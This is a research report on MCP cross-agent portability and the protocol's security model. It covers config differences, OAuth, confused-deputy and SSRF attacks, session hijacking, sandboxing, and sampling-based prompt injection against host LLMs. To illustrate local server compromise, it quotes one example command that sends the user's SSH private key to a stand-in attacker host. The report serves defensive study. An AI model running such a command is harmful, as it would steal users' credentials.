# MCP Cross-Agent Compatibility and Security Model

**Research date:** 2026-06-02
**Scope:** Cross-agent MCP portability (Claude Code, OpenCode, OpenAI Codex, VS Code Copilot) and MCP security models — sandboxing, permissions, credential injection, known vulnerabilities.

---

## Part A: Cross-Agent Compatibility

### What the MCP Spec Defines for Portability

MCP (Model Context Protocol) is an open protocol using **JSON-RPC 2.0** messages over stateful connections. The spec is intended as a "USB-C port for AI" — build once, integrate everywhere. The core portability contract is:

- **Transport**: Two standard transports defined: `stdio` (subprocess stdin/stdout) and `Streamable HTTP` (HTTP POST + optional SSE). Clients **SHOULD** support `stdio` whenever possible. Custom transports are allowed but reduce portability.
- **Capability negotiation**: At initialization, clients and servers exchange capability declarations. This is the primary mechanism for cross-version and cross-agent compatibility. Servers only use features the client has declared, and vice versa.
- **Message schema**: The TypeScript schema at `schema/2025-03-26/schema.ts` is the normative source of truth. There is also a generated JSON Schema for tooling. Both JSON-RPC request/response and notification types are defined.
- **Protocol versioning**: HTTP transport clients **MUST** include an `MCP-Protocol-Version` header on all requests. Servers that receive no version header **SHOULD** assume `2025-03-26`. Invalid versions receive HTTP 400. Backwards compatibility between `2024-11-05` (HTTP+SSE) and `2025-03-26` (Streamable HTTP) is defined explicitly.

**Source:** https://modelcontextprotocol.io/specification/2025-03-26 and https://modelcontextprotocol.io/docs/concepts/transports

### Config Format Incompatibilities Across Agents

There is **no standard config file format** defined by the MCP spec. Each agent uses its own config schema:

| Agent | Config format | Key differences |
|---|---|---|
| **Claude Code** | JSON in `~/.claude/claude_code_config.json` or per-project `.claude/settings.json` | Uses `mcpServers` key, `type: stdio/http`, `command/args/env` fields |
| **Claude Desktop** | JSON in `claude_desktop_config.json` | Similar schema to Claude Code but separate file |
| **OpenCode** | JSONC in `opencode.json` under `mcp` key | `type: local/remote`, supports OAuth, tool wildcard patterns |
| **VS Code / Copilot** | `.vscode/mcp.json` or user settings | Different nesting, workspace-scoped |
| **Cursor** | `.cursor/mcp.json` | Similar to VS Code |

Config formats are not portable between agents. A server binary works across agents, but the config entry (command path, env vars, auth) must be maintained separately for each agent.

### Transport Compatibility

- **stdio** is universally supported and is the de facto standard for local server portability. All major agents (Claude Code, Claude Desktop, OpenCode, VS Code Copilot, Cursor) support launching a subprocess via `command + args`.
- **Streamable HTTP** (as of 2025-03-26 spec) replaces the older HTTP+SSE transport. Not all agents have updated: some still use the 2024-11-05 HTTP+SSE pattern. Compatibility falls back automatically if clients attempt POST first and fall back to GET+SSE.
- **Remote MCP servers** require HTTP transport and OAuth. OpenCode explicitly implements OAuth Dynamic Client Registration (RFC 7591) and stores tokens at `~/.local/share/opencode/mcp-auth.json`. Claude Code's OAuth support is not clearly documented at the same level.

### Authentication Portability

The MCP spec defines an OAuth 2.1-based authorization framework (with PKCE, Dynamic Client Registration, and Authorization Server Metadata discovery) for HTTP transport. For **stdio**, the spec explicitly states: implementations **SHOULD NOT** follow the HTTP auth spec and instead **retrieve credentials from the environment**.

This creates a clean split:
- **stdio servers**: Credentials passed via environment variables in the host config. Portable in principle, but each agent's config file uses different env-var injection syntax.
- **HTTP/remote servers**: OAuth 2.1 required. OpenCode auto-handles OAuth flows; other agents vary in support. The Extension Support Matrix (https://modelcontextprotocol.io/extensions/client-matrix.md) shows only `Claude (web)`, `Claude Desktop`, `VS Code Copilot`, `Goose`, `Postman`, `MCPJam`, `ChatGPT`, `Cursor`, and `Archestra.AI` listed — Claude Code (CLI) is **not listed** in the extension support matrix. No client currently shows OAuth Client Credentials or Enterprise Auth support except Archestra.AI.

### OpenAI Codex Compatibility

OpenAI's platform (ChatGPT, Codex) is documented as supporting MCP: https://developers.openai.com/api/docs/mcp — listed in the MCP intro as a supported client. The Responses API supports remote MCP servers. Tool-search is natively supported by OpenAI's API (https://developers.openai.com/api/docs/guides/tools-tool-search). However, direct access to the detailed Codex/OpenAI Agents MCP docs was blocked during this research session; exact config format and permission model require verification from OpenAI docs directly.

### Emerging Standards

- **Extension negotiation** via `extensions` field in `initialize` capabilities is the main portability mechanism for new features beyond the core spec.
- **Agent Skills** (https://modelcontextprotocol.io/docs/develop/build-with-agent-skills) are a new concept for guiding AI coding assistants through MCP server design — skill files can declare which MCP servers they need; only Claude Code appears to implement this currently.
- **Tool search** (native at the model provider level, e.g., Anthropic's tool-search-tool, OpenAI's) is emerging as a standard pattern for large tool counts; reduces context window pressure but is provider-specific.
- **Progressive tool discovery** (lazy tool loading) and **programmatic tool calling** (code-mode sandboxed execution) are defined in MCP client best practices (https://modelcontextprotocol.io/docs/develop/clients/client-best-practices.md) but are client-specific implementations.

---

## Part B: Security Model

### MCP Spec Security Principles

The MCP specification defines security at the philosophy level, not the enforcement level: "MCP itself cannot enforce these security principles at the protocol level." The spec lists:

1. **User Consent and Control** — explicit consent required for all data access and operations
2. **Data Privacy** — hosts must obtain consent before exposing user data
3. **Tool Safety** — tools represent arbitrary code execution; hosts must get explicit user consent before invoking
4. **LLM Sampling Controls** — users must approve sampling requests; human-in-the-loop required for `sampling/createMessage`

**Source:** https://modelcontextprotocol.io/specification/2025-03-26

### Known Attack Vectors and Vulnerabilities

These are documented in the MCP Security Best Practices guide (https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices.md):

#### 1. Confused Deputy Attack
- **Condition**: MCP proxy server uses static OAuth client ID for third-party API, allows dynamic client registration for MCP clients, and third-party auth server uses consent cookies.
- **Attack**: Attacker registers malicious client with attacker-controlled redirect_uri, sends user a crafted link. Existing consent cookie bypasses consent screen. Authorization code redirected to attacker.
- **Mitigation**: MCP proxy MUST implement per-client consent stored server-side, checked before initiating third-party auth. Consent cookies must use `__Host-` prefix, Secure/HttpOnly/SameSite=Lax attributes, signed and bound to specific client_id.

#### 2. Token Passthrough Anti-Pattern
- **Risk**: MCP server accepts tokens issued for upstream service and passes them to downstream APIs without validation. Bypasses rate limiting, audit trails, and access controls. Enables data exfiltration with stolen tokens.
- **Mitigation**: MCP servers MUST NOT accept tokens not explicitly issued for the MCP server.

#### 3. Server-Side Request Forgery (SSRF)
- **Attack**: Malicious MCP server populates OAuth metadata discovery URLs with internal network addresses (cloud metadata endpoints at `169.254.169.254`, internal IPs). MCP client fetches these URLs during auth, leaking credentials or triggering internal service requests.
- **Mitigation**: MCP clients SHOULD enforce HTTPS, block private IP ranges (RFC 1918), validate redirect targets, use egress proxies (e.g., Smokescreen). DNS TOCTOU is a specific risk — pin resolution between check and use.

#### 4. Session Hijacking (Two variants)
- **Prompt Injection via session**: Attacker obtains session ID and injects malicious events into a shared queue on Server B, which are then consumed by Server A and forwarded to the client as asynchronous responses.
- **Impersonation**: Attacker obtains session ID and makes calls to server without re-authentication.
- **Mitigation**: Servers MUST use secure random session IDs; MUST NOT use sessions for authentication; SHOULD bind session IDs to user-specific information (key format: `<user_id>:<session_id>`); MUST verify all inbound requests.

#### 5. Local MCP Server Compromise
- **Attack**: Malicious startup commands embedded in client config (e.g., `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://evil.com`). Or malicious payload inside the server binary. Or DNS rebinding to access local HTTP server from remote origin.
- **Mitigation**: MCP clients MUST implement pre-configuration consent dialogs showing exact command before execution. SHOULD sandbox servers with restricted filesystem/network access. For HTTP transport, local servers SHOULD require auth token or use unix domain sockets.

#### 6. Scope Minimization Failures
- **Risk**: Broad initial token scopes expand blast radius of token compromise. Wildcard scopes or omnibus grants (`*`, `all`, `full-access`) enable privilege chaining.
- **Mitigation**: Progressive, least-privilege scope model. Minimal initial scopes, incremental elevation via WWW-Authenticate challenges. Servers must not publish full scope catalog; avoid wildcard scopes.

### Agent-Specific Permission and Sandboxing Models

#### Claude Code
- **Permission model**: Three-state allow/ask/deny per tool category. Configured in `settings.json` (`allowedTools`, `disallowedTools`) at project or user level. Human approval required by default for tool calls outside allow-list.
- **MCP server approval**: MCP servers must be registered in config before Claude Code will connect. Claude Code shows tool descriptions at connection time; user must have already reviewed the server source.
- **Credential injection**: Environment variables specified in config under `env` key alongside the server command. No OAuth auto-handling documented (contrast with OpenCode).
- **Sandboxing**: No OS-level sandbox on MCP server subprocesses — the server runs with the same user privileges as Claude Code itself. Tool execution (Bash, file ops) is sandboxed via the permission approval model, not OS isolation.

#### OpenCode
- **Permission model**: Three-state (`allow`, `ask`, `deny`) with 13 distinct permission types. Most default to `allow`. `external_directory` and `doom_loop` default to `ask`. `.env` files denied by default. Wildcard pattern rules with last-matching-rule-wins evaluation.
- **MCP server types**: `local` (subprocess) and `remote` (HTTP). Admin can disable entire MCP categories globally, selectively enable per-agent.
- **Credential handling**: OAuth auto-handled for remote servers. Token stored at `~/.local/share/opencode/mcp-auth.json`. OAuth can be disabled (`oauth: false`) for API key auth via headers.
- **Sandboxing**: No OS-level sandboxing explicitly documented; permission model controls which operations are allowed, not which processes can be launched.

#### MCP Spec Sandboxing Guidance
- **Programmatic tool calling** (code-mode) requires a sandbox environment with no direct network access. The MCP client best practices document recommends using Deno, `isolated-vm`, Wasmtime, or similar. Credentials are held by the host broker and never exposed to sandbox-generated code.
- **API keys and tokens**: "Authorization tokens and credentials are held by the host and never exposed to the generated code." (MCP client best practices)
- **Per-call authorization**: Approving a script does not grant blanket approval for all tool calls it makes at runtime. Hosts may grant categorical approval per script run but broker must evaluate each call.

### Sampling Security
- `sampling/createMessage` allows MCP servers to request LLM completions without needing server-side API keys.
- **Risk**: A server could use sampling to exfiltrate context or craft prompt injection attacks against the host LLM.
- **Spec requirement**: "There SHOULD always be a human in the loop with the ability to deny sampling requests." Clients SHOULD provide UI to review prompts and responses before sending/delivery.
- **Source:** https://modelcontextprotocol.io/docs/concepts/sampling

---

## Sources

1. MCP Specification 2025-03-26 Overview: https://modelcontextprotocol.io/specification/2025-03-26
2. MCP Architecture: https://modelcontextprotocol.io/specification/2025-03-26/architecture
3. MCP Transports: https://modelcontextprotocol.io/docs/concepts/transports
4. MCP Authorization Specification: https://modelcontextprotocol.io/specification/2025-03-26/basic/authorization
5. MCP Security Best Practices: https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices.md
6. MCP Sampling: https://modelcontextprotocol.io/docs/concepts/sampling
7. MCP Client Best Practices (Progressive Discovery + Code Mode): https://modelcontextprotocol.io/docs/develop/clients/client-best-practices.md
8. MCP Extension Support Matrix: https://modelcontextprotocol.io/extensions/client-matrix.md
9. OpenCode MCP Server Config: https://opencode.ai/docs/mcp-servers
10. OpenCode Permission Model: https://opencode.ai/docs/permissions

---

## Conflicts and Gaps

| Item | Status |
|---|---|
| Claude Code OAuth support | Not clearly documented; OpenCode has explicit OAuth handling. Needs verification from Anthropic docs directly. |
| OpenAI Codex MCP config format | Access blocked during research. Listed in MCP ecosystem as supported. |
| OS-level sandboxing of stdio MCP servers | No agent currently provides OS-level sandbox for stdio servers. All rely on permission-model soft controls. |
| Prompt injection / tool poisoning | Not covered in current MCP security best practices beyond sampling controls. Known community concern but not in official docs. |
| Cross-agent skill portability | Claude Code "agent skills" concept (skill files declaring MCP server dependencies) appears to be Claude Code-specific, not an MCP spec feature. |
| Extension support matrix completeness | Claude Code (CLI) is absent from the official extension support matrix; matrix covers Claude (web) and Claude Desktop separately. |

---

## Recency

- MCP spec version covered: `2025-03-26` (current stable); a `2025-06-18` version is referenced in some transport and lifecycle pages, indicating active development.
- OpenCode permission model documentation reflects current state as of June 2026.
- MCP Security Best Practices page appears recently published (references OAuth 2.1 IETF draft, RFC 9728 from 2024).

---

## Analysis

1. **The MCP spec is transport-portable but not host-portable.** The JSON-RPC message format and capability negotiation mean any compliant server works across agents at the wire level. But config files, env-var injection syntax, OAuth handling, and permission UX are all agent-specific. "Write once, run anywhere" applies to the server binary, not the deployment configuration.

2. **Security enforcement is entirely delegated to hosts.** The spec explicitly disclaims protocol-level enforcement. This creates a fragmented security landscape: an MCP server's actual risk profile depends entirely on which agent runs it and how that agent implements consent dialogs, sandboxing, and credential isolation. A server that is safe in Claude Code (with explicit tool approval) could be more dangerous in an agent with default-allow permissions.

3. **stdio is more secure than HTTP for local servers.** The spec's own guidance: stdio restricts access to only the MCP client, while HTTP requires auth tokens or unix sockets to prevent DNS rebinding. Yet stdio offers no OS-level isolation; the subprocess inherits the user's full privileges.

4. **Credentials in environment variables is the only portable pattern.** For stdio servers, the spec says "retrieve credentials from the environment." This is universally supported but unencrypted at rest in config files. OAuth token storage (OpenCode's `mcp-auth.json`) is agent-specific and not standardized.

5. **The confused deputy and SSRF attacks are novel and protocol-level.** These are not just implementation bugs — they exploit the design of MCP's OAuth proxy pattern and metadata discovery. Any agent implementing MCP OAuth support needs active SSRF mitigations (IP blocklist, HTTPS enforcement, egress proxies) that are not currently listed in the extension support matrix for any client.
